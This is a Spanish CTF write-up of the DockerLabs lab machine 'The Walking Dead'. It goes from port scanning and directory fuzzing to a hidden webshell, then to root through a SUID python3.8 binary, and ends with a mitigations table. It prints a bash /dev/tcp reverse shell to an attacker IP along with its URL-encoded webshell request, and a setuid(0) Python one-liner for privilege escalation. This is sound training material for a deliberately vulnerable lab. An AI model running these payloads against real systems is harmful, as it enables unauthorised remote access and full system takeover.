# Walking-Dead
Laboratorio para practicar técnicas básicas de explotación en entornos web.
# 🧟 The Walking Dead — CTF | DockerLabs

> *"Survive... if you can."*

Writeup de la máquina vulnerable **The Walking Dead** de [DockerLabs](https://dockerlabs.es/).
Recorrido completo desde el reconocimiento inicial hasta la obtención de **root**.

| | |
|---|---|
| **Plataforma** | DockerLabs |
| **Dificultad** | Fácil |
| **Técnicas** | Enumeración web · LFI de código fuente · Webshell / RCE · Reverse shell · SUID Privesc |
| **IP objetivo** | `172.17.0.2` |
| **IP atacante** | `10.0.2.15` |

---

## 📑 Índice

1. [Reconocimiento](#-1-reconocimiento)
2. [Enumeración web](#-2-enumeración-web)
3. [Explotación — Webshell oculta](#-3-explotación--webshell-oculta)
4. [Shell interactiva (www-data)](#-4-shell-interactiva-www-data)
5. [Escalada de privilegios — SUID python3.8](#-5-escalada-de-privilegios--suid-python38)
6. [Resumen de la cadena de ataque](#-resumen-de-la-cadena-de-ataque)
7. [Mitigaciones](#-mitigaciones)

---

## 🔍 1. Reconocimiento

Comprobamos conectividad con el objetivo:

```bash
ping -c 1 172.17.0.2
```

```
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.130 ms
```

El `ttl=64` nos confirma que se trata de una máquina **Linux**.

Lanzamos un escaneo completo de puertos con Nmap:

```bash
sudo nmap -p- -sS -sC -sV -vvv -T5 -Pn -n 172.17.0.2
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: The Walking Dead - CTF
```

Dos puertos abiertos:

- **22/tcp** → SSH (OpenSSH 8.2p1)
- **80/tcp** → HTTP (Apache 2.4.41), con el título *The Walking Dead - CTF*

Sin credenciales, el SSH queda descartado de momento. El vector de entrada estará en el **puerto 80**.

![Página principal](assets/01-main-page.png)

---

## 🌐 2. Enumeración web

Fuzzeamos directorios y ficheros con **gobuster**, añadiendo extensiones habituales:

```bash
gobuster dir -u http://172.17.0.2/ \
  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
  -x php,txt,backup --exclude-length 10701
```

```
backup.txt           (Status: 200) [Size: 53]
hidden               (Status: 301) [Size: 309] [--> http://172.17.0.2/hidden/]
server-status        (Status: 403) [Size: 275]
```

Confirmamos con **dirb** que el directorio `/hidden/` tiene *directory listing* habilitado:

```bash
dirb http://172.17.0.2
```

```
==> DIRECTORY: http://172.17.0.2/hidden/
(!) WARNING: Directory IS LISTABLE.
```

Sin embargo, al visitarlo aparece **vacío** (solo el *Parent Directory*). La pista está escondida en otro sitio.

![Index of /hidden](assets/02-hidden-dir.png)

El fichero `backup.txt` solo contiene una pista falsa:

```
Error 403: Forbidden. Directory listing is disabled.
```

### 🕵️ La clave: el código fuente

Revisando el **código fuente** de la página principal (`Ctrl+U` / `view-source:`), encontramos un enlace oculto mediante la clase CSS `hidden-link`:

```html
<p class="hidden-link"><a href="hidden/.shell.php">Access Panel</a></p>
```

![Código fuente con .shell.php](assets/03-view-source-shell.png)

Un fichero **`.shell.php`** (oculto por empezar con `.`, por eso no aparecía en el listado). Todo apunta a una **webshell**.

---

## 💥 3. Explotación — Webshell oculta

El fichero `.shell.php` ejecuta comandos a través del parámetro `cmd` (equivalente a un `system($_GET['cmd'])`), lo que nos da **ejecución remota de comandos (RCE)**.

### Preparar la reverse shell

Usamos [revshells.com](https://www.revshells.com/) para generar una reverse shell de **Bash**, apuntando a nuestra IP (`10.0.2.15`) y puerto `4444`:

```bash
bash -c "bash -i >& /dev/tcp/10.0.2.15/4444 0>&1"
```

![revshells.com](assets/04-revshells.png)

Como el payload viaja por la URL, lo **URL-encodeamos** con el *Decoder* de Burp Suite para evitar que caracteres como `&`, `/` o los espacios rompan la petición:

![Burp Decoder](assets/05-burp-decoder.png)

### Ponernos en escucha y lanzar el payload

Levantamos el listener en la Kali:

```bash
nc -lvnp 4444
```

Y disparamos la webshell desde el navegador con el comando URL-encodeado:

```
http://172.17.0.2/hidden/.shell.php?cmd=bash+-c+"bash+-i+>%26+%2fdev%2ftcp%2f10.0.2.15%2f4444+0>%261"
```

![Ejecución del RCE](assets/06-rce-exec.png)

---

## 🐚 4. Shell interactiva (www-data)

Recibimos la conexión en el listener:

```
connect to [10.0.2.15] from (UNKNOWN) [172.17.0.2] 37354
www-data@db4df683f2a2:/var/www/html/hidden$
```

¡Dentro como **`www-data`**! Hacemos un tratamiento básico de la TTY y enumeramos el sistema de ficheros buscando vectores de escalada.

---

## 👑 5. Escalada de privilegios — SUID python3.8

Listamos los binarios con el bit **SUID** activado (se ejecutan con los privilegios de su propietario, normalmente `root`):

```bash
find / -perm -4000 2>/dev/null
```

```
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/umount
/usr/bin/su
/usr/bin/mount
/usr/bin/man
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/python3.8      <-- 🚩
/usr/bin/sudo
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

**`/usr/bin/python3.8` con SUID** no es nada habitual: es nuestro vector. Consultamos [GTFOBins](https://gtfobins.github.io/gtfobins/python/#suid).

> ⚠️ **Detalle importante:** no basta con lanzar una shell. Python, al arrancar `/bin/sh`, suelta los privilegios efectivos y nos quedaríamos como `www-data`. Hay que forzar el UID real a `0` con `os.setuid(0)` **antes** de abrir la shell.

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash -p")'
```

Comprobamos:

```bash
id
# uid=0(root) gid=33(www-data) groups=33(www-data)
whoami
# root
```

![SUID python3.8 a root](assets/07-suid-root.png)

🎉 **¡Somos root!** Máquina comprometida.

---

## 🧩 Resumen de la cadena de ataque

```
Nmap (22, 80)
      │
      ▼
Enumeración web (gobuster / dirb)  ──►  /hidden/ · backup.txt (pistas)
      │
      ▼
Código fuente  ──►  hidden/.shell.php  (webshell oculta, clase "hidden-link")
      │
      ▼
RCE vía parámetro cmd  ──►  reverse shell (bash + revshells + Burp encode)
      │
      ▼
www-data@db4df683f2a2
      │
      ▼
find SUID  ──►  /usr/bin/python3.8
      │
      ▼
os.setuid(0) + /bin/bash -p  ──►  🏁 ROOT
```

---

## 🛡️ Mitigaciones

| Fallo | Recomendación |
|---|---|
| Webshell `.shell.php` en producción | Eliminar cualquier panel de administración/debug; nunca ejecutar entrada de usuario con `system()`/`exec()`. |
| Enlace oculto en el código fuente | No confiar en la "seguridad por oscuridad"; ocultar con CSS no protege nada. |
| *Directory listing* habilitado | Deshabilitar `Options Indexes` en Apache. |
| `python3.8` con bit SUID | Retirar el SUID (`chmod u-s`). Ningún intérprete debería tener SUID. |
| Servicio web ejecutándose con permisos amplios | Aplicar el principio de mínimo privilegio a `www-data`. |

---

## 📚 Referencias

- [GTFOBins — python (SUID)](https://gtfobins.github.io/gtfobins/python/#suid)
- [revshells.com](https://www.revshells.com/)
- [DockerLabs](https://dockerlabs.es/)

---
